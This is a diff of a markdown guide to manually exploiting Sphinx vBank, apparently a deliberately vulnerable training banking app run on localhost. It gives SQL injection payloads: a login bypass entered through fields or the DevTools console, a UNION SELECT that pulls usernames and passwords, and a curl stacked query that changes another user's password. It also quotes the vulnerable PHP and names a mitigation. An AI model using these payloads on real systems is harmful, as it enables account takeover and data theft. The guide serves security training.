@@ -1,29 +1,43 @@
-# Sphinx vBank: Senior Penetration Testing Manual
+# Sphinx vBank: Advanced Manual Penetration Testing Guide
 
-This document outlines the manual exploitation of Sphinx vBank. As a senior tester, our goal is to understand the underlying logic flaws by bypassing client-side controls and manipulating server-side state.
+This guide provides a professional walkthrough of the vulnerabilities within Sphinx vBank, focusing on manual exploitation techniques for learning purposes.
 
 ---
 
-## 1. Authentication & Identity Attacks
+## 1. SQL Injection (SQLi)
 
-### 1.1 SQL Injection: Authentication Bypass
-**Vulnerability**: Direct string concatenation in `htdocs/login.php`.
-**Code**: `$sql = "... where ...username='$username' and ...password='$password'";`
+### 1.1 Authentication Bypass
+**Definition**: Exploiting vulnerable SQL queries to gain access to an application without valid credentials.
+**Vulnerable Code**: `htdocs/login.php` (Lines 16-18)
+```php
+$username = $_REQUEST['username'];
+$password = $_REQUEST['password'];
+$sql = "SELECT * FROM " . $htbconf['db/users'] . " where " . $htbconf['db/users.username'] . "='$username' and " . $htbconf['db/users.password'] . "='$password'";
+```
+**Impact**: Complete unauthorized access to user accounts and sensitive banking data.
+**Mitigation**: Use Prepared Statements with parameterized queries (PDO or MySQLi).
 
-**Manual Method (Browser DevTools)**:
+**Manual Method (Browser)**:
 1. Navigate to the login page.
-2. Open the Console (F12).
-3. Execute:
-   ```javascript
-   document.loginForm.username.value = "' OR '1'='1";
-   document.loginForm.password.value = "ignore";
-   document.loginForm.submit();
-   ```
-4. **Why it works**: You are bypassing the `checkform()` function in `htb.js` which normally blocks the `'` character.
+2. Enter `' OR '1'='1` in the username and password fields.
+3. If the browser's JavaScript blocks you, open DevTools (F12), go to the **Console**, and type:
+   `document.loginForm.username.value = "' OR '1'='1"; document.loginForm.submit();`
 
-**Manual Method (cURL)**:
+### 1.2 Data Retrieval: Enumerating Accounts
+**Manual Method (Burp Suite)**:
+1. Once logged in, navigate to **Account Details**.
+2. Intercept the request. Note the `account` parameter (e.g., `252170513`).
+3. Use a `UNION SELECT` payload in the login field or search field to extract other users.
+4. **Payload**: `' UNION SELECT 1,username,password,name,firstname,null,null,null FROM users-- -`
+
+### 1.3 Stacked Queries: Changing Passwords & Creating Accounts
+**Vulnerability**: The use of `multi_query()` in `htdocs/login.php` (Line 23) allows multiple SQL statements separated by a semicolon.
+**Impact**: Attackers can modify, delete, or add data to any table.
+
+**Manual Scenario: Change Bob's Password**:
+1. Use cURL to send a stacked query:
 ```bash
-curl -i -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&password=x"
+curl -i "http://localhost/login.php?username=alex';UPDATE+users+SET+password='hacked'+WHERE+username='bob';--+-&password=x"
 ```
 
 ### 1.2 Account Enumeration (Zero-Knowledge)
